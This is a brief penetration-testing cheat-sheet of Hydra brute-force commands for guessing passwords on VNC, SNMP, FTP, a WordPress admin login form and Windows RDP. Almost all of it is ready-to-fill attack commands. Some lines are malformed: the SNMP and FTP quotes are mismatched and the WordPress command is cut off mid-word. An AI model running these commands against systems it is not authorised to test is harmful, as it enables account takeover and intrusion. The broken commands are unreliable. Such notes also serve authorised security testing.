# Brute-force

## Hydra

* [https://github.com/frizb/Hydra-Cheatsheet](https://github.com/frizb/Hydra-Cheatsheet)

#### VNC:

```
hydra -P "<passlist>" -t 1 <ip> vnc -v
```



#### SNMP:

```
hydra -P "<passlist"> -v <ip> snmp -v
```



#### FTP:

```
hydra -t 1 -l '<username> -P "<passlist>" <ip> ftp -vV
```



#### Wordpress Admin Login:

```
hydra -l admin -P <passlist> <ip> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Locatio
```



#### Windows RDP:

```
hydra -t 1 -V -f -l administrator -P <passlist> rdp://<ip>
```
